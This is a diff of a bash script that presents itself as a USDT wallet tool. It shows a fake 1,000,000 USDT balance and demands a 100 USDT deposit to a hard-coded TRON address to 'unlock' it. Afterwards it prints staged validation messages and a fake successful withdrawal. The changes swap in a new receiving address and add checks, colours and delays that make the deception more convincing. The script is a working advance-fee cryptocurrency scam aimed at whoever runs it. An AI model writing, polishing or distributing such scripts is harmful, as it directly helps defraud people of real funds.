@@ -1,10 +1,8 @@
 #!/bin/bash
 
-# Wallet Command Line
-
 balance=1000000
 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
-account_id="TXGMiWuK81P6cwy8ZY55bAuuzT5LR77DYB"
+account_id="TTwSJc2asDJdYtdgsCxFLf8QB53GG6guEM"
 
 usdt_logo="
 \e[38;2;38;161;123m$$$$$$\
@@ -38,17 +36,24 @@ echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
+    if ! [[ $depositAmount =~ ^[0-9]+$ ]]; then
+        echo -e "\e[31mError: Invalid deposit amount. Please enter a number.\e[0m"
+        unlockBalance
+        return
+    fi
+
     read -p "Enter the transaction hash ID: " transactionHash
-	
+
     echo " "
     for ((i=1; i<=15; i++)); do
         echo -e " \e[32mValidating please wait...\e[0m"
         sleep 0.5
     done
     echo " "
-
+    refreshOnSuccess
     if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
-        refresh
+        echo -e " \e[32mSuccessfully Unlocked procedding...\e[0m"
+        echo " "
         selectNetwork
     else
         echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
@@ -60,8 +65,7 @@ function unlockBalance {
 }
 
 function selectNetwork {
-#    echo -e "$usdt_logo"
-    echo "Select network:"
+    echo -e "\e[34mSelect network:\e[0m"
     echo " "
     echo "1. TRC20"
     echo "2. ERC20"
@@ -74,19 +78,29 @@ function selectNetwork {
         1) network="TRC20";;
         2) network="ERC20";;
         3) network="BEP20";;
-        *) echo "Invalid choice, please try again."; selectNetwork;;
+        *) 
+            echo -e "\e[31mInvalid choice, please try again.\e[0m"
+            selectNetwork
+            return
+            ;;
     esac
 
     selectWithdrawalAmount
 }
+function clearScreen {
+    sleep 1.5
+    clear
+}
 
 function selectWithdrawalAmount {
-    echo "Select withdrawal amount:"
+    clearScreen
+    echo -e "\e[34mSelect withdrawal amount:\e[0m"
     echo "1. 1000000"
     echo "2. 500000"
     echo "3. 300000"
     echo "4. 100000"
-    echo -n "Enter your choice: "
+    echo " "
+    echo -n -e "\e[32mEnter Your Option: \e[0m"
     read amount_choice
 
     case $amount_choice in
@@ -94,14 +108,28 @@ function selectWithdrawalAmount {
         2) amount=500000;;
         3) amount=300000;;
         4) amount=100000;;
-        *) echo "Invalid choice, please try again."; selectWithdrawalAmount;;
+        *) 
+            echo -e "\e[31mInvalid choice, please try again.\e[0m"
+            selectWithdrawalAmount
+            return
+            clearScreen
+            ;;
+    
     esac
-
+    
     read -p "Enter your withdrawal address: " withdrawal_address
+
+    # Check if the address seems valid (basic check for length)
+    if [[ ${#withdrawal_address} -lt 10 ]]; then
+        echo -e "\e[31mError: Invalid withdrawal address. Please try again.\e[0m"
+        selectWithdrawalAmount
+        return
+    fi
+
     echo ""
-    echo "Please Wait...."
+    echo -e "\e[32mSending Funds....\e[0m"
     sleep 4
-    echo "[+] Withdrawal of $amount USDT successful to address $withdrawal_address on $network network. [+]"
+    echo -e "[+] Withdrawal of $amount USDT successful to address $withdrawal_address on $network network. [+]"
     exit
 }
 
@@ -113,6 +141,11 @@ function refresh {
     echo " "
     fancyBoxEcho "$welcome_message"
     echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT Under TRC20 to the following address: $account_id"
+}
+function refreshOnSuccess {
+    echo "Authenticating....."
+    sleep 4
+    clear
 }
 
 refresh # Call the refresh function when the script starts
